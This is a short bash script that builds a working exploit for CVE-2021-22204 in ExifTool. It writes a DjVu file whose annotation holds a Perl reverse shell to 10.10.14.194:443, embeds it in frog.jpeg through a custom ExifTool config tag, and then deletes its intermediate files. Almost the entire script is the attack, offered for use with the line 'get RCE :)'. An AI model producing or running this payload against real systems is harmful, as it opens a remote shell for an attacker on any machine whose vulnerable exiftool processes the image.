#!/bin/bash

sudo apt install djvulibre-bin

printf 'P1 1 1 0' > revshell.pbm

cjb2 revshell.pbm revshell.djvu

printf 'ANTa\0\0\0\xd3' >> revshell.djvu

# Update LHOST & LPORT here
cat <<'EOF' >> revshell.djvu
(xmp "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(443,inet_aton('10.10.14.194')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};#"
EOF

echo "Created malicious revshell.djvu"

echo "
%Image::ExifTool::UserDefined = (
    # All EXIF tags are added to the Main table, and WriteGroup is used to
    # specify where the tag is written (default is ExifIFD if not specified):
    'Image::ExifTool::Exif::Main' => {
        # Example 1.  EXIF:NewEXIFTag
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
        # add more user-defined EXIF tags here...
    },
);
1; #end%
" >> configfile

echo "Pass frog.jpeg to a exiftool vulnerable to CVE-2021-22204 & get RCE :)" 

exiftool -config configfile '-HasselbladExif<=revshell.djvu' frog.jpeg

rm ./configfile ./revshell.djvu ./revshell.pbm ./frog.jpeg_original
